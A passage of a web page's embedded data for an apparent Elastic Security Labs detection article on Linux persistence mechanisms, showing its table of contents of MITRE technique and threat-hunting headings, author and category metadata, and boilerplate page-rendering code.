mechanism: setuid and setgid","href":"#t1548001---abuse-elevation-control-mechanism-setuid-and-setgid"},{"level":3,"title":"Persistence through T1548.001 - setuid and setgid","href":"#persistence-through-t1548001---setuid-and-setgid"},{"level":3,"title":"Hunting for T1548.001 - setuid and setgid","href":"#hunting-for-t1548001---setuid-and-setgid"},{"level":2,"title":"T1548.003 - abuse elevation control mechanism: sudo and sudo caching (sudoers file modification)","href":"#t1548003---abuse-elevation-control-mechanism-sudo-and-sudo-caching-sudoers-file-modification"},{"level":3,"title":"Persistence through T1548.003 - sudoers file modification","href":"#persistence-through-t1548003---sudoers-file-modification"},{"level":3,"title":"Hunting for T1548.003 - sudoers file modification","href":"#hunting-for-t1548003---sudoers-file-modification"},{"level":2,"title":"T1098/T1136 - account manipulation/creation","href":"#t1098t1136---account-manipulationcreation"},{"level":3,"title":"T1136.001 - create account: local account","href":"#t1136001---create-account-local-account"},{"level":3,"title":"T1098 - account manipulation: user credential modification","href":"#t1098---account-manipulation-user-credential-modification"},{"level":3,"title":"T1098 - account manipulation: direct /etc/passwd file modification","href":"#t1098---account-manipulation-direct-etcpasswd-file-modification"},{"level":3,"title":"T1136.001 - create account: backdoor user creation","href":"#t1136001---create-account-backdoor-user-creation"},{"level":3,"title":"T1098 - account manipulation: user added to privileged group","href":"#t1098---account-manipulation-user-added-to-privileged-group"},{"level":3,"title":"Persistence through T1098/T1136 - account manipulation/creation","href":"#persistence-through-t1098t1136---account-manipulationcreation"},{"level":3,"title":"Hunting for T1098/T1136 - account manipulation/creation","href":"#hunting-for-t1098t1136---account-manipulationcreation"},{"level":2,"title":"T1098.004 - account manipulation: SSH","href":"#t1098004---account-manipulation-ssh"},{"level":3,"title":"Persistence through T1098.004 - SSH modification","href":"#persistence-through-t1098004---ssh-modification"},{"level":3,"title":"Hunting for T1098.004 - SSH modification","href":"#hunting-for-t1098004---ssh-modification"},{"level":2,"title":"T1059.004 - command and scripting interpreter: bind shells","href":"#t1059004---command-and-scripting-interpreter-bind-shells"},{"level":3,"title":"Persistence through T1059.004 - bind shells","href":"#persistence-through-t1059004---bind-shells"},{"level":3,"title":"Hunting for T1059.004 - bind shells","href":"#hunting-for-t1059004---bind-shells"},{"level":2,"title":"T1059.004 - command and scripting interpreter: reverse shells","href":"#t1059004---command-and-scripting-interpreter-reverse-shells"},{"level":2,"title":"Conclusion","href":"#conclusion"}],"author":[{"title":"Ruben Groenewoud","slug":"ruben-groenewoud","description":"Security Research Engineer, Elastic","body":{"raw":"","code":"var Component=(()=\u003e{var x=Object.create;var s=Object.defineProperty;var d=Object.getOwnPropertyDescriptor;var g=Object.getOwnPropertyNames;var f=Object.getPrototypeOf,l=Object.prototype.hasOwnProperty;var _=(e,t)=\u003e()=\u003e(t||e((t={exports:{}}).exports,t),t.exports),j=(e,t)=\u003e{for(var n in t)s(e,n,{get:t[n],enumerable:!0})},a=(e,t,n,u)=\u003e{if(t\u0026\u0026typeof t==\"object\"||typeof t==\"function\")for(let o of g(t))!l.call(e,o)\u0026\u0026o!==n\u0026\u0026s(e,o,{get:()=\u003et[o],enumerable:!(u=d(t,o))||u.enumerable});return e};var p=(e,t,n)=\u003e(n=e!=null?x(f(e)):{},a(t||!e||!e.__esModule?s(n,\"default\",{value:e,enumerable:!0}):n,e)),b=e=\u003ea(s({},\"__esModule\",{value:!0}),e);var i=_((D,c)=\u003e{c.exports=_jsx_runtime});var y={};j(y,{default:()=\u003eh,frontmatter:()=\u003ew});var r=p(i()),w={title:\"Ruben Groenewoud\",description:\"Security Research Engineer, Elastic\",slug:\"ruben-groenewoud\"};function m(e){return(0,r.jsx)(r.Fragment,{})}function M(e={}){let{wrapper:t}=e.components||{};return t?(0,r.jsx)(t,Object.assign({},e,{children:(0,r.jsx)(m,e)})):m(e)}var h=M;return b(y);})();\n;return Component;"},"_id":"authors/ruben-groenewoud.mdx","_raw":{"sourceFilePath":"authors/ruben-groenewoud.mdx","sourceFileName":"ruben-groenewoud.mdx","sourceFileDir":"authors","contentType":"mdx","flattenedPath":"authors/ruben-groenewoud"},"type":"Author","imageUrl":"","url":"/authors/ruben-groenewoud"}],"category":[{"title":"Detection science","slug":"detection-science","body":{"raw":"","code":"var Component=(()=\u003e{var x=Object.create;var c=Object.defineProperty;var f=Object.getOwnPropertyDescriptor;var _=Object.getOwnPropertyNames;var d=Object.getPrototypeOf,g=Object.prototype.hasOwnProperty;var j=(t,e)=\u003e()=\u003e(e||t((e={exports:{}}).exports,e),e.exports),l=(t,e)=\u003e{for(var n in e)c(t,n,{get:e[n],enumerable:!0})},i=(t,e,n,s)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let o of _(e))!g.call(t,o)\u0026\u0026o!==n\u0026\u0026c(t,o,{get:()=\u003ee[o],enumerable:!(s=f(e,o))||s.enumerable});return t};var p=(t,e,n)=\u003e(n=t!=null?x(d(t)):{},i(e||!t||!t.__esModule?c(n,\"default\",{value:t,enumerable:!0}):n,t)),D=t=\u003ei(c({},\"__esModule\",{value:!0}),t);var u=j((h,a)=\u003e{a.exports=_jsx_runtime});var X={};l(X,{default:()=\u003eF,frontmatter:()=\u003eM});var r=p(u()),M={title:\"Detection science\",slug:\"detection-science\"};function m(t){return(0,r.jsx)(r.Fragment,{})}function C(t={}){let{wrapper:e}=t.components||{};return e?(0,r.jsx)(e,Object.assign({},t,{children:(0,r.jsx)(m,t)})):m(t)}var F=C;return D(X);})();\n;return Component;"},"_id":"categories/detection-science.mdx","_raw":{"sourceFilePath":"categories/detection-science.mdx","sourceFileName":"detection-science.mdx","sourceFileDir":"categories","contentType":"mdx","flattenedPath":"categories/detection-science"},"type":"Category","url":"/categories/detection-science"}]},"seriesArticles":null},"__N_SSG":true},"page":"/[slug]","query":{"slug":"primer-on-persistence-mechanisms"},"buildId":"dGrrQfBbQkqaleQ_11aBK","assetPrefix":"/security-labs","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>